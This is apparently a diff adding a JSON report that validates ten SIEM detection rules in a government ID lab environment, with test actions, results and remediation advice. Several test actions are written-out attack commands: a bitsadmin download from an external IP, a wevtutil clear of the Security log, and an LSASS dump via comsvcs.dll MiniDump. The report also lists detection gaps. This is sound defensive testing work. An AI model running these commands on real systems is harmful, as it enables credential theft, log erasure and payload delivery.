@@ -1,0 +1,108 @@
+{
+  "_meta": {
+    "exercise": "NDSA GovID 2.0 Detection Validation — INCD-CID Section 8",
+    "date": "2026-02-15",
+    "authorization": "INCD pre-notification filed 2026-02-10; CyberShield Ltd. engagement letter signed",
+    "lab_environment": "NDSA GOVNET OPS replica (GovID 2.0 lab, VRID-SRV-01 lab, JUMPHOST lab)",
+    "siem": "NDSA Elastic Security 8.13.4",
+    "red_team": "CyberShield Ltd. + NDSA Detection Engineering (Gila Ben-Moshe)",
+    "scope": "GOV-DET-001 through GOV-DET-010"
+  },
+  "results": [
+    {
+      "rule_id": "GOV-DET-001",
+      "rule_name": "Contractor VPN off-hours logon",
+      "test_action": "Connected to lab PAM VPN gateway with contractor credentials at 02:00 IST (UTC+3)",
+      "result": "PARTIAL",
+      "finding": "Alert fires but with 30-minute suppression window still active from prior FP-reduction config. First alert delayed. Without suppression: PASS. Must remove suppression and add country-anomaly condition before production deployment.",
+      "recommendation": "Remove suppression window; add 'source country != IL' as additional condition to reduce FP while maintaining sensitivity."
+    },
+    {
+      "rule_id": "GOV-DET-002",
+      "rule_name": "Lateral movement from Contractor DMZ",
+      "test_action": "SSH from contractor DMZ to GOVNET OPS (lab) on non-authorized port",
+      "result": "PARTIAL",
+      "finding": "Alert fires correctly but with 30-minute delay due to NetFlow collection interval. In the March 2025 incident, adversary completed database dump in 35 minutes. A 30-minute detection delay means only 5 minutes of response time. Delay must be reduced.",
+      "recommendation": "Reduce NetFlow collection interval from 30 min to 5 min for DMZ->GOVNET flows. Emergency change request submitted."
+    },
+    {
+      "rule_id": "GOV-DET-003",
+      "rule_name": "BITS job to non-Microsoft ASN",
+      "test_action": "bitsadmin /transfer test-job https://198.51.100.44/dummy.bin C:\\temp\\test.bin",
+      "result": "PASS",
+      "finding": "Alert fires within 25 seconds. Lab confirmed bitsadmin.exe /transfer to external IP triggers rule. Note: rule not deployed on GovID 2.0 nodes — Windows-only; GovID 2.0 frontend runs on Linux.",
+      "recommendation": "Deploy rule to all remaining Windows hosts. For Linux GovID 2.0 nodes, create equivalent rule using curl/wget monitoring."
+    },
+    {
+      "rule_id": "GOV-DET-004",
+      "rule_name": "wevtutil log clear",
+      "test_action": "wevtutil.exe cl Security",
+      "result": "PASS",
+      "finding": "Fires within 2 minutes as documented. Highest-confidence rule in inventory. No tuning needed.",
+      "recommendation": "No changes required. Maintain as-is."
+    },
+    {
+      "rule_id": "GOV-DET-005",
+      "rule_name": "VRID full-table SELECT query",
+      "test_action": "SELECT * FROM vrid_test_citizens (lab replica with 50k test records)",
+      "result": "PASS",
+      "finding": "Alert fires. Confirmed working. Lab replica uses same detection logic as production. Note: only covers VRID-SRV-01 schema — GovID 2.0 API logs not covered (different log format).",
+      "recommendation": "Extend similar logic to GovID 2.0 API logs when Sprint 23 is deployed."
+    },
+    {
+      "rule_id": "GOV-DET-006",
+      "rule_name": "Biometric API bulk extraction",
+      "test_action": "Sent 500 biometric match requests in 5 minutes via mock API client",
+      "result": "FAIL",
+      "finding": "Rule is DRAFT and not deployed. Sprint 23 API structured logging not yet in lab environment. Mock test using manually crafted log entries confirms rule logic is correct, but end-to-end testing requires Sprint 23 completion.",
+      "recommendation": "Schedule validation test for Sprint 24 (2 weeks after Sprint 23 deployment). Deploy to production only after passing lab test."
+    },
+    {
+      "rule_id": "GOV-DET-007",
+      "rule_name": "GovID API rate limit bypass",
+      "test_action": "Sent 1000 authentication requests in 60 seconds to lab GovID API",
+      "result": "FAIL",
+      "finding": "Rule is DRAFT and not deployed. API rate limit events require structured logging from Kong API Gateway — not yet configured in lab or production.",
+      "recommendation": "Configure Kong rate-limit plugin to emit structured events to Elastic. Estimated: 3 days engineering effort. Schedule in next sprint."
+    },
+    {
+      "rule_id": "GOV-DET-008",
+      "rule_name": "Staging-to-production API cross-contamination",
+      "test_action": "Attempted to use staging API token against production endpoint in lab",
+      "result": "FAIL",
+      "finding": "Sprint 23 fix not deployed — staging and production API namespaces not yet separated in lab. Rule logic is sound but cannot be tested until Sprint 23.",
+      "recommendation": "Same Sprint 23 dependency as GOV-DET-006. Test in Sprint 24."
+    },
+    {
+      "rule_id": "GOV-DET-009",
+      "rule_name": "AiTM phishing lookalike domain DNS resolution",
+      "test_action": "DNS query for govid-authentication.com from lab contractor DMZ endpoint",
+      "result": "FAIL",
+      "finding": "Rule is DRAFT. Sysmon not deployed on JUMPHOST-CONTRACTOR-01 (lab or production). DNS monitoring not available on Contractor DMZ. Cannot test without deploying DNS monitoring.",
+      "recommendation": "Submit CAB change request to deploy Sysmon on JUMPHOST-CONTRACTOR-01. 5 business day approval. Compensating control: block known domains at DNS resolver immediately."
+    },
+    {
+      "rule_id": "GOV-DET-010",
+      "rule_name": "LSASS comsvcs.dll MiniDump",
+      "test_action": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump [test-pid] C:\\temp\\test.dmp full",
+      "result": "PARTIAL",
+      "finding": "Alert fires correctly. However, production alert-fatigue issue confirmed — Veeam backup triggers 3 alerts per night; SOC has learned to dismiss without investigation. Backup filter not functioning correctly for Veeam agent path.",
+      "recommendation": "Fix filter_backup_tools: add Veeam service account (svc-veeam) to User exclusion list. Validate Veeam no longer triggers after fix."
+    }
+  ],
+  "summary": {
+    "PASS": ["GOV-DET-003", "GOV-DET-004", "GOV-DET-005"],
+    "PARTIAL": ["GOV-DET-001", "GOV-DET-002", "GOV-DET-010"],
+    "FAIL": ["GOV-DET-006", "GOV-DET-007", "GOV-DET-008", "GOV-DET-009"],
+    "total_rules": 10,
+    "active_rules_passing": "3/6 (50%) of active rules pass",
+    "draft_rules_tested": "0/4 draft rules deployable without blockers",
+    "incd_compliance_assessment": "SECTION 8 REQUIREMENT NOT MET — 50% pass rate on active rules; 4 rules not testable due to architectural blockers. INCD report must document gaps and remediation timeline.",
+    "critical_blockers": [
+      "Sprint 23 not deployed — blocks GOV-DET-006, GOV-DET-007, GOV-DET-008",
+      "No DNS monitoring on Contractor DMZ — blocks GOV-DET-009",
+      "NetFlow delay 30min — reduces GOV-DET-002 effectiveness"
+    ],
+    "board_presentation_recommendation": "Do NOT claim full detection coverage. Report: 3 rules confirmed working, 3 rules partially working with known fixes, 4 rules blocked pending architectural changes. Provide remediation timeline."
+  }
+}
